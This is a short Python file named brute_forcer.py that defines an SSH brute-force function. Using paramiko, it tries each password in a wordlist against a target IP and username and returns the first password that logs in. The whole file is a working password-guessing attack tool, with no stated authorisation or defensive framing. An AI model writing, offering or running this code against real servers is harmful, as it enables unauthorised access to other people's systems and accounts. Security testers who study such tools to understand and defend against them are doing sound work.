# brute_forcer.py
import paramiko
from utils import validate_ip

def ssh_brute_force(target, username, pwd_file):
    if not validate_ip(target):
        raise ValueError("Invalid IP address")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(pwd_file) as f:
        for pwd in f:
            pwd = pwd.strip()
            try:
                client.connect(target, username=username, password=pwd, timeout=3)
                client.close()
                return pwd
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                print(f"Error: {e}")
                break
    return None
